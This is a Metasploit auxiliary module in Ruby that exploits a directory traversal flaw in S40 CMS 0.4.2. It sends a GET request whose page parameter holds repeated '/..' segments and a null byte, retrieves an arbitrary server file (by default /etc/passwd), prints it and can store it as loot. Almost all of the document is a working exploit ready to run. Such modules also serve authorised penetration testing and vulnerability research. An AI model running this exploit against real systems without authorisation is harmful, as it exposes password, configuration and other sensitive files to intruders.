##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'S40 0.4.2 CMS Directory Traversal Vulnerability',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability found in S40 CMS.
        The flaw is due to the 'page' function not properly handling the $pid parameter,
        which allows a malicious user to load an arbitrary file path.
      },
      'References'     =>
        [
          [ 'OSVDB', '82469'],
          [ 'EDB', '17129' ]
        ],
      'Author'         =>
        [
          'Osirys <osirys[at]autistici.org>',  #Discovery, PoC
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2011-04-07'
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new("TARGETURI", [true, 'The base path to S40', '/s40/']),
        OptString.new("FILE", [true, 'The file to retrieve', '/etc/passwd']),
        OptBool.new('SAVE', [false, 'Save the HTTP body', false]),
        OptInt.new("DEPTH", [true, 'Traversal depth', 10])
      ])
  end

  def run_host(ip)
    uri = target_uri.path
    uri << '/' if uri[-1, 1] != '/'

    t = "/.." * datastore['DEPTH']

    vprint_status("Retrieving #{datastore['FILE']}")

    # No permission to access.log or proc/self/environ, so this is all we do :-/
    uri = normalize_uri(uri, 'index.php')
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "#{uri}/?p=#{t}#{datastore['FILE']}%00"
    })

    if not res
      vprint_error("Server timed out")
    elsif res and res.body =~ /Error 404 requested page cannot be found/
      vprint_error("Either the file doesn't exist, or you don't have the permission to get it")
    else
      # We don't save the body by default, because there's also other junk in it.
      # But we still have a SAVE option just in case
      print_good("#{datastore['FILE']} retrieved")
      vprint_line(res.body)

      if datastore['SAVE']
        p = store_loot(
          's40.file',
          'application/octet-stream',
          rhost,
          res.body,
          ::File.basename(datastore['FILE'])
        )
        print_good("File saved as: #{p}")
      end
    end
  end
end
